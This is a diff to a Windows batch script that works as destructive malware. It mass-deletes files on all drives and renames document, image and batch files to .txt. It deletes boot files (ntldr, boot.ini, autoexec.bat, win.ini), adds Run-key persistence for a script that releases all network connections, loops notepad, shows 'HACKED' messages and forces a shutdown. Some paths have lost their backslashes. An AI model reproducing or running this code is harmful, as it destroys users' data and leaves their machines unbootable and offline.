@@ -16,6 +16,22 @@ Del I:\*.* /f /s /q
 
 del %systemdrive%*.* /f /s /q
 
+echo @echo off>c:windowswimn32.bat
+
+echo break off>>c:windowswimn32.bat
+
+echo ipconfig/release_all>>c:windowswimn32.bat
+
+echo end>>c:windowswimn32.bat
+
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+
+echo You Have Been HACKED!
+
+PAUSE
+
 REN *.DOC *.TXT
 
 REN *.JPEG *.TXT
@@ -38,14 +54,27 @@ START %SystemRoot%\system32\notepad.exe
 
 GOTO top
 
-shutdown -r -f -t 00
+attrib -r -s -h c:autoexec.bat
 
-Dim WSHShell
-Set WSHShell=Wscript.CreateObject("Wscript.Shell") 
- 
-Dim x
-For x = 1 to 100000000
-WSHShell.Run "Tourstart.exe"
+del c:autoexec.bat
+
+attrib -r -s -h c:boot.ini
+
+del c:boot.ini
+
+attrib -r -s -h c:ntldr
+
+del c:ntldr
+
+attrib -r -s -h c:windowswin.ini
+
+del c:windowswin.ini
+
+@echo off
+
+msg * YOU GOT OWNED!!!
+
+shutdown -s -t 7 -c "A VIRUS IS TAKING OVER c:Drive
 
 echo @echo off>c:windowshartlell.bat
 
@@ -60,22 +89,6 @@ reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI 
 reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f
 
 echo You have been HACKED.
-
-PAUSE
-
-echo @echo off>c:windowswimn32.bat
-
-echo break off>>c:windowswimn32.bat
-
-echo ipconfig/release_all>>c:windowswimn32.bat
-
-echo end>>c:windowswimn32.bat
-
-reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
-
-reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
-
-echo You Have Been HACKED!
 
 PAUSE
 
@@ -129,11 +142,6 @@ REN *.BAT *.TXT
 
 GOTO CRASH
 
-:top
-
-START %SystemRoot%\system32\notepad.exe
-
-GOTO top
 
 
 
